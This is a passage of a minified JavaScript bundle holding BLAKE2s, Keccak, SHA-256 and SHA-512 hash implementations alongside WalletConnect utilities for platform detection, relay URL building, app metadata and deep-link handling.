n(d,g,w,_,C,v){o[d]=o[d]+o[g]+C,o[_]=r(o[_]^o[d],16),o[w]=o[w]+o[_],o[g]=r(o[g]^o[w],12),o[d]=o[d]+o[g]+v,o[_]=r(o[_]^o[d],8),o[w]=o[w]+o[_],o[g]=r(o[g]^o[w],7)}function r(d,g){return d>>>g^d<<32-g}const i=new Uint32Array([1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225]),s=new Uint8Array([0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,14,10,4,8,9,15,13,6,1,12,0,2,11,7,5,3,11,8,12,0,5,2,15,13,10,14,3,6,7,1,9,4,7,9,3,1,13,12,11,14,2,6,5,10,4,0,15,8,9,0,5,7,2,4,10,15,14,1,11,12,6,8,3,13,2,12,6,10,0,11,8,3,4,13,7,5,15,14,1,9,12,5,1,15,14,13,4,10,0,7,6,3,9,2,8,11,13,11,7,14,12,1,3,9,5,0,15,4,8,6,2,10,6,15,14,9,11,3,0,8,12,2,13,7,1,4,10,5,10,2,8,4,7,6,1,5,15,11,9,14,3,12,13,0]),o=new Uint32Array(16),a=new Uint32Array(16);function c(d,g){let w=0;for(w=0;w<8;w++)o[w]=d.h[w],o[w+8]=i[w];for(o[12]^=d.t,o[13]^=d.t/4294967296,g&&(o[14]=~o[14]),w=0;w<16;w++)a[w]=e(d.b,4*w);for(w=0;w<10;w++)n(0,4,8,12,a[s[w*16+0]],a[s[w*16+1]]),n(1,5,9,13,a[s[w*16+2]],a[s[w*16+3]]),n(2,6,10,14,a[s[w*16+4]],a[s[w*16+5]]),n(3,7,11,15,a[s[w*16+6]],a[s[w*16+7]]),n(0,5,10,15,a[s[w*16+8]],a[s[w*16+9]]),n(1,6,11,12,a[s[w*16+10]],a[s[w*16+11]]),n(2,7,8,13,a[s[w*16+12]],a[s[w*16+13]]),n(3,4,9,14,a[s[w*16+14]],a[s[w*16+15]]);for(w=0;w<8;w++)d.h[w]^=o[w]^o[w+8]}function l(d,g){if(!(d>0&&d<=32))throw new Error("Incorrect output length, should be in [1, 32]");const w=g?g.length:0;if(g&&!(w>0&&w<=32))throw new Error("Incorrect key length, should be in [1, 32]");const _={h:new Uint32Array(i),b:new Uint8Array(64),c:0,t:0,outlen:d};return _.h[0]^=16842752^w<<8^d,w>0&&(u(_,g),_.c=64),_}function u(d,g){for(let w=0;w<g.length;w++)d.c===64&&(d.t+=d.c,c(d,!1),d.c=0),d.b[d.c++]=g[w]}function h(d){for(d.t+=d.c;d.c<64;)d.b[d.c++]=0;c(d,!0);const g=new Uint8Array(d.outlen);for(let w=0;w<d.outlen;w++)g[w]=d.h[w>>2]>>8*(w&3)&255;return g}function f(d,g,w){w=w||32,d=t.normalizeInput(d);const _=l(w,g);return u(_,d),h(_)}function p(d,g,w){const _=f(d,g,w);return t.toHex(_)}return Ko={blake2s:f,blake2sHex:p,blake2sInit:l,blake2sUpdate:u,blake2sFinal:h},Ko}var Ho,zu;function Tx(){if(zu)return Ho;zu=1;const t=Cx(),e=Px();return Ho={blake2b:t.blake2b,blake2bHex:t.blake2bHex,blake2bInit:t.blake2bInit,blake2bUpdate:t.blake2bUpdate,blake2bFinal:t.blake2bFinal,blake2s:e.blake2s,blake2sHex:e.blake2sHex,blake2sInit:e.blake2sInit,blake2sUpdate:e.blake2sUpdate,blake2sFinal:e.blake2sFinal},Ho}var Bx=Tx(),Rx={};const kx=":";function fs(t){const[e,n]=t.split(kx);return{namespace:e,reference:n}}function vp(t,e){return t.includes(":")?[t]:e.chains||[]}var Nx=Object.defineProperty,Ux=Object.defineProperties,Mx=Object.getOwnPropertyDescriptors,Vu=Object.getOwnPropertySymbols,Lx=Object.prototype.hasOwnProperty,Fx=Object.prototype.propertyIsEnumerable,Ua=(t,e,n)=>e in t?Nx(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,Wu=(t,e)=>{for(var n in e||(e={}))Lx.call(e,n)&&Ua(t,n,e[n]);if(Vu)for(var n of Vu(e))Fx.call(e,n)&&Ua(t,n,e[n]);return t},jx=(t,e)=>Ux(t,Mx(e)),Ku=(t,e,n)=>Ua(t,typeof e!="symbol"?e+"":e,n);const qx="ReactNative",ft={reactNative:"react-native",node:"node",browser:"browser",unknown:"unknown"},zx="js";function Ps(){return typeof process<"u"&&typeof process.versions<"u"&&typeof process.versions.node<"u"}function Bn(){return!cn.getDocument()&&!!cn.getNavigator()&&navigator.product===qx}function Vx(){return Bn()&&typeof global<"u"&&typeof(global==null?void 0:global.Platform)<"u"&&(global==null?void 0:global.Platform.OS)==="android"}function Wx(){return Bn()&&typeof global<"u"&&typeof(global==null?void 0:global.Platform)<"u"&&(global==null?void 0:global.Platform.OS)==="ios"}function zr(){return!Ps()&&!!cn.getNavigator()&&!!cn.getDocument()}function Ni(){return Bn()?ft.reactNative:Ps()?ft.node:zr()?ft.browser:ft.unknown}function Hu(){var t;try{return Bn()&&typeof global<"u"&&typeof(global==null?void 0:global.Application)<"u"?(t=global.Application)==null?void 0:t.applicationId:void 0}catch{return}}function Kx(t,e){const n=new URLSearchParams(t);return Object.entries(e).sort(([r],[i])=>r.localeCompare(i)).forEach(([r,i])=>{i!=null&&n.set(r,String(i))}),n.toString()}function Hx(t){var e,n;const r=Ep();try{return t!=null&&t.url&&r.url&&new URL(t.url).host!==new URL(r.url).host&&(console.warn(`The configured WalletConnect 'metadata.url':${t.url} differs from the actual page url:${r.url}. This is probably unintended and can lead to issues.`),t.url=r.url),(e=t?.icons)!=null&&e.length&&t.icons.length>0&&(t.icons=t.icons.filter(i=>i!=="")),jx(Wu(Wu({},r),t),{url:t?.url||r.url,name:t?.name||r.name,description:t?.description||r.description,icons:(n=t?.icons)!=null&&n.length&&t.icons.length>0?t.icons:r.icons})}catch(i){return console.warn("Error populating app metadata",i),t||r}}function Ep(){return q1.getWindowMetadata()||{name:"",description:"",url:"",icons:[""]}}function Gx(){if(Ni()===ft.reactNative&&typeof global<"u"&&typeof(global==null?void 0:global.Platform)<"u"){const{OS:n,Version:r}=global.Platform;return[n,r].join("-")}const t=k1();if(t===null)return"unknown";const e=t.os?t.os.replace(" ","").toLowerCase():"unknown";return t.type==="browser"?[e,t.name,t.version].join("-"):[e,t.version].join("-")}function Yx(){var t;const e=Ni();return e===ft.browser?[e,((t=cn.getLocation())==null?void 0:t.host)||"unknown"].join(":"):e}function xp(t,e,n){const r=Gx(),i=Yx();return[[t,e].join("-"),[zx,n].join("-"),r,i].join("/")}function Zx({protocol:t,version:e,relayUrl:n,sdkVersion:r,auth:i,projectId:s,useOnCloseEvent:o,bundleId:a,packageName:c}){const l=n.split("?"),u=xp(t,e,r),h={auth:i,ua:u,projectId:s,useOnCloseEvent:o,packageName:c||void 0,bundleId:a||void 0},f=Kx(l[1]||"",h);return l[0]+"?"+f}function Gn(t,e){return t.filter(n=>e.includes(n)).length===t.length}function Ma(t){return Object.fromEntries(t.entries())}function La(t){return new Map(Object.entries(t))}function Vn(t=z.FIVE_MINUTES,e){const n=z.toMiliseconds(t||z.FIVE_MINUTES);let r,i,s,o;return{resolve:a=>{s&&r&&(clearTimeout(s),r(a),o=Promise.resolve(a))},reject:a=>{s&&i&&(clearTimeout(s),i(a))},done:()=>new Promise((a,c)=>{if(o)return a(o);s=setTimeout(()=>{const l=new Error(e);o=Promise.reject(l),c(l)},n),r=a,i=c})}}function zt(t,e,n){return new Promise(async(r,i)=>{const s=setTimeout(()=>i(new Error(n)),e);try{const o=await t;r(o)}catch(o){i(o)}clearTimeout(s)})}function _p(t,e){if(typeof e=="string"&&e.startsWith(`${t}:`))return e;if(t.toLowerCase()==="topic"){if(typeof e!="string")throw new Error('Value must be "string" for expirer target type: topic');return`topic:${e}`}else if(t.toLowerCase()==="id"){if(typeof e!="number")throw new Error('Value must be "number" for expirer target type: id');return`id:${e}`}throw new Error(`Unknown expirer target type: ${t}`)}function Xx(t){return _p("topic",t)}function Jx(t){return _p("id",t)}function Ip(t){const[e,n]=t.split(":"),r={id:void 0,topic:void 0};if(e==="topic"&&typeof n=="string")r.topic=n;else if(e==="id"&&Number.isInteger(Number(n)))r.id=Number(n);else throw new Error(`Invalid target, expected id:number or topic:string, got ${e}:${n}`);return r}function Ee(t,e){return z.fromMiliseconds(Date.now()+z.toMiliseconds(t))}function vn(t){return Date.now()>=z.toMiliseconds(t)}function oe(t,e){return`${t}${e?`:${e}`:""}`}function nr(t=[],e=[]){return[...new Set([...t,...e])]}async function Qx({id:t,topic:e,wcDeepLink:n}){var r;try{if(!n)return;const i=typeof n=="string"?JSON.parse(n):n,s=i?.href;if(typeof s!="string")return;const o=e3(s,t,e),a=Ni();if(a===ft.browser){if(!((r=cn.getDocument())!=null&&r.hasFocus())){console.warn("Document does not have focus, skipping deeplink.");return}t3(o)}else a===ft.reactNative&&typeof(global==null?void 0:global.Linking)<"u"&&await global.Linking.openURL(o)}catch(i){console.error(i)}}function e3(t,e,n){const r=`requestId=${e}&sessionTopic=${n}`;t.endsWith("/")&&(t=t.slice(0,-1));let i=`${t}`;if(t.startsWith("https://t.me")){const s=t.includes("?")?"&startapp=":"?startapp=";i=`${i}${s}${s3(r,!0)}`}else i=`${i}/wc?${r}`;return i}function t3(t){let e="_self";i3()?e="_top":(r3()||t.startsWith("https://")||t.startsWith("http://"))&&(e="_blank"),window.open(t,e,"noreferrer noopener")}async function n3(t,e){let n="";try{if(zr()&&(n=localStorage.getItem(e),n))return n;n=await t.getItem(e)}catch(r){console.error(r)}return n}function Gu(t,e){if(!t.includes(e))return null;const n=t.split(/([&,?,=])/),r=n.indexOf(e);return n[r+2]}function Yu(){return typeof crypto<"u"&&crypto!=null&&crypto.randomUUID?crypto.randomUUID():"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/gu,t=>{const e=Math.random()*16|0;return(t==="x"?e:e&3|8).toString(16)})}function jc(){return typeof process<"u"&&Rx.IS_VITEST==="true"}function r3(){return typeof window<"u"&&(!!window.TelegramWebviewProxy||!!window.Telegram||!!window.TelegramWebviewProxyProto)}function i3(){try{return window.self!==window.top}catch{return!1}}function s3(t,e=!1){const n=Buffer.from(t).toString("base64");return e?n.replace(/[=]/g,""):n}function Sp(t){return Buffer.from(t,"base64").toString("utf-8")}function o3(t){return new Promise(e=>setTimeout(e,t))}let a3=class{constructor({limit:e}){Ku(this,"limit"),Ku(this,"set"),this.limit=e,this.set=new Set}add(e){if(!this.set.has(e)){if(this.set.size>=this.limit){const n=this.set.values().next().value;n&&this.set.delete(n)}this.set.add(e)}}has(e){return this.set.has(e)}};const es=BigInt(2**32-1),Zu=BigInt(32);function Dp(t,e=!1){return e?{h:Number(t&es),l:Number(t>>Zu&es)}:{h:Number(t>>Zu&es)|0,l:Number(t&es)|0}}function Ap(t,e=!1){const n=t.length;let r=new Uint32Array(n),i=new Uint32Array(n);for(let s=0;s<n;s++){const{h:o,l:a}=Dp(t[s],e);[r[s],i[s]]=[o,a]}return[r,i]}const Xu=(t,e,n)=>t>>>n,Ju=(t,e,n)=>t<<32-n|e>>>n,En=(t,e,n)=>t>>>n|e<<32-n,xn=(t,e,n)=>t<<32-n|e>>>n,li=(t,e,n)=>t<<64-n|e>>>n-32,ui=(t,e,n)=>t>>>n-32|e<<64-n,c3=(t,e)=>e,l3=(t,e)=>t,u3=(t,e,n)=>t<<n|e>>>32-n,h3=(t,e,n)=>e<<n|t>>>32-n,f3=(t,e,n)=>e<<n-32|t>>>64-n,d3=(t,e,n)=>t<<n-32|e>>>64-n;function Ot(t,e,n,r){const i=(e>>>0)+(r>>>0);return{h:t+n+(i/2**32|0)|0,l:i|0}}const qc=(t,e,n)=>(t>>>0)+(e>>>0)+(n>>>0),zc=(t,e,n,r)=>e+n+r+(t/2**32|0)|0,p3=(t,e,n,r)=>(t>>>0)+(e>>>0)+(n>>>0)+(r>>>0),g3=(t,e,n,r,i)=>e+n+r+i+(t/2**32|0)|0,y3=(t,e,n,r,i)=>(t>>>0)+(e>>>0)+(n>>>0)+(r>>>0)+(i>>>0),m3=(t,e,n,r,i,s)=>e+n+r+i+s+(t/2**32|0)|0,br=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;function Xs(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function ln(t){if(!Number.isSafeInteger(t)||t<0)throw new Error("positive integer expected, got "+t)}function Pt(t,...e){if(!Xs(t))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function Js(t){if(typeof t!="function"||typeof t.create!="function")throw new Error("Hash should be wrapped by utils.createHasher");ln(t.outputLen),ln(t.blockLen)}function Tn(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function Vc(t,e){Pt(t);const n=e.outputLen;if(t.length<n)throw new Error("digestInto() expects output buffer of length at least "+n)}function Si(t){return new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength/4))}function _t(...t){for(let e=0;e<t.length;e++)t[e].fill(0)}function Go(t){return new DataView(t.buffer,t.byteOffset,t.byteLength)}function kt(t,e){return t<<32-e|t>>>e}const Op=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;function $p(t){return t<<24&4278190080|t<<8&16711680|t>>>8&65280|t>>>24&255}const Jt=Op?t=>t:t=>$p(t);function w3(t){for(let e=0;e<t.length;e++)t[e]=$p(t[e]);return t}const _n=Op?t=>t:w3,Cp=typeof Uint8Array.from([]).toHex=="function"&&typeof Uint8Array.fromHex=="function",b3=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function Pr(t){if(Pt(t),Cp)return t.toHex();let e="";for(let n=0;n<t.length;n++)e+=b3[t[n]];return e}const Yt={_0:48,_9:57,A:65,F:70,a:97,f:102};function Qu(t){if(t>=Yt._0&&t<=Yt._9)return t-Yt._0;if(t>=Yt.A&&t<=Yt.F)return t-(Yt.A-10);if(t>=Yt.a&&t<=Yt.f)return t-(Yt.a-10)}function Ts(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);if(Cp)return Uint8Array.fromHex(t);const e=t.length,n=e/2;if(e%2)throw new Error("hex string expected, got unpadded hex of length "+e);const r=new Uint8Array(n);for(let i=0,s=0;i<n;i++,s+=2){const o=Qu(t.charCodeAt(s)),a=Qu(t.charCodeAt(s+1));if(o===void 0||a===void 0){const c=t[s]+t[s+1];throw new Error('hex string expected, got non-hex character "'+c+'" at index '+s)}r[i]=o*16+a}return r}function Pp(t){if(typeof t!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(t))}function Ct(t){return typeof t=="string"&&(t=Pp(t)),Pt(t),t}function Dn(...t){let e=0;for(let r=0;r<t.length;r++){const i=t[r];Pt(i),e+=i.length}const n=new Uint8Array(e);for(let r=0,i=0;r<t.length;r++){const s=t[r];n.set(s,i),i+=s.length}return n}let Qs=class{};function Ui(t){const e=r=>t().update(Ct(r)).digest(),n=t();return e.outputLen=n.outputLen,e.blockLen=n.blockLen,e.create=()=>t(),e}function v3(t){const e=(r,i)=>t(i).update(Ct(r)).digest(),n=t({});return e.outputLen=n.outputLen,e.blockLen=n.blockLen,e.create=r=>t(r),e}function ur(t=32){if(br&&typeof br.getRandomValues=="function")return br.getRandomValues(new Uint8Array(t));if(br&&typeof br.randomBytes=="function")return Uint8Array.from(br.randomBytes(t));throw new Error("crypto.getRandomValues must be defined")}const E3=BigInt(0),Qr=BigInt(1),x3=BigInt(2),_3=BigInt(7),I3=BigInt(256),S3=BigInt(113),Tp=[],Bp=[],Rp=[];for(let t=0,e=Qr,n=1,r=0;t<24;t++){[n,r]=[r,(2*n+3*r)%5],Tp.push(2*(5*r+n)),Bp.push((t+1)*(t+2)/2%64);let i=E3;for(let s=0;s<7;s++)e=(e<<Qr^(e>>_3)*S3)%I3,e&x3&&(i^=Qr<<(Qr<<BigInt(s))-Qr);Rp.push(i)}const kp=Ap(Rp,!0),D3=kp[0],A3=kp[1],eh=(t,e,n)=>n>32?f3(t,e,n):u3(t,e,n),th=(t,e,n)=>n>32?d3(t,e,n):h3(t,e,n);function O3(t,e=24){const n=new Uint32Array(10);for(let r=24-e;r<24;r++){for(let o=0;o<10;o++)n[o]=t[o]^t[o+10]^t[o+20]^t[o+30]^t[o+40];for(let o=0;o<10;o+=2){const a=(o+8)%10,c=(o+2)%10,l=n[c],u=n[c+1],h=eh(l,u,1)^n[a],f=th(l,u,1)^n[a+1];for(let p=0;p<50;p+=10)t[o+p]^=h,t[o+p+1]^=f}let i=t[2],s=t[3];for(let o=0;o<24;o++){const a=Bp[o],c=eh(i,s,a),l=th(i,s,a),u=Tp[o];i=t[u],s=t[u+1],t[u]=c,t[u+1]=l}for(let o=0;o<50;o+=10){for(let a=0;a<10;a++)n[a]=t[o+a];for(let a=0;a<10;a++)t[o+a]^=~n[(a+2)%10]&n[(a+4)%10]}t[0]^=D3[r],t[1]^=A3[r]}_t(n)}let $3=class Np extends Qs{constructor(e,n,r,i=!1,s=24){if(super(),this.pos=0,this.posOut=0,this.finished=!1,this.destroyed=!1,this.enableXOF=!1,this.blockLen=e,this.suffix=n,this.outputLen=r,this.enableXOF=i,this.rounds=s,ln(r),!(0<e&&e<200))throw new Error("only keccak-f1600 function is supported");this.state=new Uint8Array(200),this.state32=Si(this.state)}clone(){return this._cloneInto()}keccak(){_n(this.state32),O3(this.state32,this.rounds),_n(this.state32),this.posOut=0,this.pos=0}update(e){Tn(this),e=Ct(e),Pt(e);const{blockLen:n,state:r}=this,i=e.length;for(let s=0;s<i;){const o=Math.min(n-this.pos,i-s);for(let a=0;a<o;a++)r[this.pos++]^=e[s++];this.pos===n&&this.keccak()}return this}finish(){if(this.finished)return;this.finished=!0;const{state:e,suffix:n,pos:r,blockLen:i}=this;e[r]^=n,(n&128)!==0&&r===i-1&&this.keccak(),e[i-1]^=128,this.keccak()}writeInto(e){Tn(this,!1),Pt(e),this.finish();const n=this.state,{blockLen:r}=this;for(let i=0,s=e.length;i<s;){this.posOut>=r&&this.keccak();const o=Math.min(r-this.posOut,s-i);e.set(n.subarray(this.posOut,this.posOut+o),i),this.posOut+=o,i+=o}return e}xofInto(e){if(!this.enableXOF)throw new Error("XOF is not possible for this instance");return this.writeInto(e)}xof(e){return ln(e),this.xofInto(new Uint8Array(e))}digestInto(e){if(Vc(e,this),this.finished)throw new Error("digest() was already called");return this.writeInto(e),this.destroy(),e}digest(){return this.digestInto(new Uint8Array(this.outputLen))}destroy(){this.destroyed=!0,_t(this.state)}_cloneInto(e){const{blockLen:n,suffix:r,outputLen:i,rounds:s,enableXOF:o}=this;return e||(e=new Np(n,r,i,o,s)),e.state32.set(this.state32),e.pos=this.pos,e.posOut=this.posOut,e.finished=this.finished,e.rounds=s,e.suffix=r,e.outputLen=i,e.enableXOF=o,e.destroyed=this.destroyed,e}};const C3=(t,e,n)=>Ui(()=>new $3(e,t,n)),P3=C3(1,136,256/8);function T3(t,e,n,r){if(typeof t.setBigUint64=="function")return t.setBigUint64(e,n,r);const i=BigInt(32),s=BigInt(4294967295),o=Number(n>>i&s),a=Number(n&s),c=r?4:0,l=r?0:4;t.setUint32(e+c,o,r),t.setUint32(e+l,a,r)}function B3(t,e,n){return t&e^~t&n}function R3(t,e,n){return t&e^t&n^e&n}let Up=class extends Qs{constructor(e,n,r,i){super(),this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.blockLen=e,this.outputLen=n,this.padOffset=r,this.isLE=i,this.buffer=new Uint8Array(e),this.view=Go(this.buffer)}update(e){Tn(this),e=Ct(e),Pt(e);const{view:n,buffer:r,blockLen:i}=this,s=e.length;for(let o=0;o<s;){const a=Math.min(i-this.pos,s-o);if(a===i){const c=Go(e);for(;i<=s-o;o+=i)this.process(c,o);continue}r.set(e.subarray(o,o+a),this.pos),this.pos+=a,o+=a,this.pos===i&&(this.process(n,0),this.pos=0)}return this.length+=e.length,this.roundClean(),this}digestInto(e){Tn(this),Vc(e,this),this.finished=!0;const{buffer:n,view:r,blockLen:i,isLE:s}=this;let{pos:o}=this;n[o++]=128,_t(this.buffer.subarray(o)),this.padOffset>i-o&&(this.process(r,0),o=0);for(let h=o;h<i;h++)n[h]=0;T3(r,i-8,BigInt(this.length*8),s),this.process(r,0);const a=Go(e),c=this.outputLen;if(c%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const l=c/4,u=this.get();if(l>u.length)throw new Error("_sha2: outputLen bigger than state");for(let h=0;h<l;h++)a.setUint32(4*h,u[h],s)}digest(){const{buffer:e,outputLen:n}=this;this.digestInto(e);const r=e.slice(0,n);return this.destroy(),r}_cloneInto(e){e||(e=new this.constructor),e.set(...this.get());const{blockLen:n,buffer:r,length:i,finished:s,destroyed:o,pos:a}=this;return e.destroyed=o,e.finished=s,e.length=i,e.pos=a,i%n&&e.buffer.set(r),e}clone(){return this._cloneInto()}};const pn=Uint32Array.from([1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225]),Le=Uint32Array.from([3418070365,3238371032,1654270250,914150663,2438529370,812702999,355462360,4144912697,1731405415,4290775857,2394180231,1750603025,3675008525,1694076839,1203062813,3204075428]),Fe=Uint32Array.from([1779033703,4089235720,3144134277,2227873595,1013904242,4271175723,2773480762,1595750129,1359893119,2917565137,2600822924,725511199,528734635,4215389547,1541459225,327033209]),k3=Uint32Array.from([1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298]),gn=new Uint32Array(64);class N3 extends Up{constructor(e=32){super(64,e,8,!1),this.A=pn[0]|0,this.B=pn[1]|0,this.C=pn[2]|0,this.D=pn[3]|0,this.E=pn[4]|0,this.F=pn[5]|0,this.G=pn[6]|0,this.H=pn[7]|0}get(){const{A:e,B:n,C:r,D:i,E:s,F:o,G:a,H:c}=this;return[e,n,r,i,s,o,a,c]}set(e,n,r,i,s,o,a,c){this.A=e|0,this.B=n|0,this.C=r|0,this.D=i|0,this.E=s|0,this.F=o|0,this.G=a|0,this.H=c|0}process(e,n){for(let h=0;h<16;h++,n+=4)gn[h]=e.getUint32(n,!1);for(let h=16;h<64;h++){const f=gn[h-15],p=gn[h-2],d=kt(f,7)^kt(f,18)^f>>>3,g=kt(p,17)^kt(p,19)^p>>>10;gn[h]=g+gn[h-7]+d+gn[h-16]|0}let{A:r,B:i,C:s,D:o,E:a,F:c,G:l,H:u}=this;for(let h=0;h<64;h++){const f=kt(a,6)^kt(a,11)^kt(a,25),p=u+f+B3(a,c,l)+k3[h]+gn[h]|0,d=(kt(r,2)^kt(r,13)^kt(r,22))+R3(r,i,s)|0;u=l,l=c,c=a,a=o+p|0,o=s,s=i,i=r,r=p+d|0}r=r+this.A|0,i=i+this.B|0,s=s+this.C|0,o=o+this.D|0,a=a+this.E|0,c=c+this.F|0,l=l+this.G|0,u=u+this.H|0,this.set(r,i,s,o,a,c,l,u)}roundClean(){_t(gn)}destroy(){this.set(0,0,0,0,0,0,0,0),_t(this.buffer)}}const Mp=Ap(["0x428a2f98d728ae22","0x7137449123ef65cd","0xb5c0fbcfec4d3b2f","0xe9b5dba58189dbbc","0x3956c25bf348b538","0x59f111f1b605d019","0x923f82a4af194f9b","0xab1c5ed5da6d8118","0xd807aa98a3030242","0x12835b0145706fbe","0x243185be4ee4b28c","0x550c7dc3d5ffb4e2","0x72be5d74f27b896f","0x80deb1fe3b1696b1","0x9bdc06a725c71235","0xc19bf174cf692694","0xe49b69c19ef14ad2","0xefbe4786384f25e3","0x0fc19dc68b8cd5b5","0x240ca1cc77ac9c65","0x2de92c6f592b0275","0x4a7484aa6ea6e483","0x5cb0a9dcbd41fbd4","0x76f988da831153b5","0x983e5152ee66dfab","0xa831c66d2db43210","0xb00327c898fb213f","0xbf597fc7beef0ee4","0xc6e00bf33da88fc2","0xd5a79147930aa725","0x06ca6351e003826f","0x142929670a0e6e70","0x27b70a8546d22ffc","0x2e1b21385c26c926","0x4d2c6dfc5ac42aed","0x53380d139d95b3df","0x650a73548baf63de","0x766a0abb3c77b2a8","0x81c2c92e47edaee6","0x92722c851482353b","0xa2bfe8a14cf10364","0xa81a664bbc423001","0xc24b8b70d0f89791","0xc76c51a30654be30","0xd192e819d6ef5218","0xd69906245565a910","0xf40e35855771202a","0x106aa07032bbd1b8","0x19a4c116b8d2d0c8","0x1e376c085141ab53","0x2748774cdf8eeb99","0x34b0bcb5e19b48a8","0x391c0cb3c5c95a63","0x4ed8aa4ae3418acb","0x5b9cca4f7763e373","0x682e6ff3d6b2b8a3","0x748f82ee5defb2fc","0x78a5636f43172f60","0x84c87814a1f0ab72","0x8cc702081a6439ec","0x90befffa23631e28","0xa4506cebde82bde9","0xbef9a3f7b2c67915","0xc67178f2e372532b","0xca273eceea26619c","0xd186b8c721c0c207","0xeada7dd6cde0eb1e","0xf57d4f7fee6ed178","0x06f067aa72176fba","0x0a637dc5a2c898a6","0x113f9804bef90dae","0x1b710b35131c471b","0x28db77f523047d84","0x32caab7b40c72493","0x3c9ebe0a15c9bebc","0x431d67c49c100d4c","0x4cc5d4becb3e42b6","0x597f299cfc657e2a","0x5fcb6fab3ad6faec","0x6c44198c4a475817"].map(t=>BigInt(t))),U3=Mp[0],M3=Mp[1],yn=new Uint32Array(80),mn=new Uint32Array(80);let Wc=class extends Up{constructor(e=64){super(128,e,16,!1),this.Ah=Fe[0]|0,this.Al=Fe[1]|0,this.Bh=Fe[2]|0,this.Bl=Fe[3]|0,this.Ch=Fe[4]|0,this.Cl=Fe[5]|0,this.Dh=Fe[6]|0,this.Dl=Fe[7]|0,this.Eh=Fe[8]|0,this.El=Fe[9]|0,this.Fh=Fe[10]|0,this.Fl=Fe[11]|0,this.Gh=Fe[12]|0,this.Gl=Fe[13]|0,this.Hh=Fe[14]|0,this.Hl=Fe[15]|0}get(){const{Ah:e,Al:n,Bh:r,Bl:i,Ch:s,Cl:o,Dh:a,Dl:c,Eh:l,El:u,Fh:h,Fl:f,Gh:p,Gl:d,Hh:g,Hl:w}=this;return[e,n,r,i,s,o,a,c,l,u,h,f,p,d,g,w]}set(e,n,r,i,s,o,a,c,l,u,h,f,p,d,g,w){this.Ah=e|0,this.Al=n|0,this.Bh=r|0,this.Bl=i|0,this.Ch=s|0,this.Cl=o|0,this.Dh=a|0,this.Dl=c|0,this.Eh=l|0,this.El=u|0,this.Fh=h|0,this.Fl=f|0,this.Gh=p|0,this.Gl=d|0,this.Hh=g|0,this.Hl=w|0}process(e,n){for(let v=0;v<16;v++,n+=4)yn[v]=e.getUint32(n),mn[v]=e.getUint32(n+=4);for(let v=16;v<80;v++){const b=yn[v-15]|0,x=mn[v-15]|0,O=En(b,x,1)^En(b,x,8)^Xu(b,x,7),B=xn(b,x,1)^xn(b,x,8)^Ju(b,x,7),k=yn[v-2]|0,$=mn[v-2]|0,N=En(k,$,19)^li(k,$,61)^Xu(k,$,6),E=xn(k,$,19)^ui(k,$,61)^Ju(k,$,6),S=p3(B,E,mn[v-7],mn[v-16]),D=g3(S,O,N,yn[v-7],yn[v-16]);yn[v]=D|0,mn[v]=S|0}let{Ah:r,Al:i,Bh:s,Bl:o,Ch:a,Cl:c,Dh:l,Dl:u,Eh:h,El:f,Fh:p,Fl:d,Gh:g,Gl:w,Hh:_,Hl:C}=this;for(let v=0;v<80;v++){const b=En(h,f,14)^En(h,f,18)^li(h,f,41),x=xn(h,f,14)^xn(h,f,18)^ui(h,f,41),O=h&p^~h&g,B=f&d^~f&w,k=y3(C,x,B,M3[v],mn[v]),$=m3(k,_,b,O,U3[v],yn[v]),N=k|0,E=En(r,i,28)^li(r,i,34)^li(r,i,39),S=xn(r,i,28)^ui(r,i,34)^ui(r,i,39),D=r&s^r&a^s&a,P=i&o^i&c^o&c;_=g|0,C=w|0,g=p|0,w=d|0,p=h|0,d=f|0,{h,l:f}=Ot(l|0,u|0,$|0,N|0),l=a|0,u=c|0,a=s|0,c=o|0,s=r|0,o=i|0;const y=qc(N,S,P);r=zc(y,$,E,D),i=y|0}({h:r,l:i}=Ot(this.Ah|0,this.Al|0,r|0,i|0)),{h:s,l:o}=Ot(this.Bh|0,this.Bl|0,s|0,o|0),{h:a,l:c}=Ot(this.Ch|0,this.Cl|0,a|0,c|0),{h:l,l:u}=Ot(this.Dh|0,this.Dl|0,l|0,u|0),{h,l:f}=Ot(this.Eh|0,this.El|0,h|0,f|0),{h:p,l:d}=Ot(this.Fh|0,this.Fl|0,p|0,d|0),{h:g,l:w}=Ot(this.Gh|0,this.Gl|0,g|0,w|0),{h:_,l:C}=Ot(this.Hh|0,this.Hl|0,_|0,C|0),this.set(r,i,s,o,a,c,l,u,h,f,p,d,g,w,_,C)}roundClean(){_t(yn,mn)}destroy(){_t(this.buffer),this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)}};class L3 extends 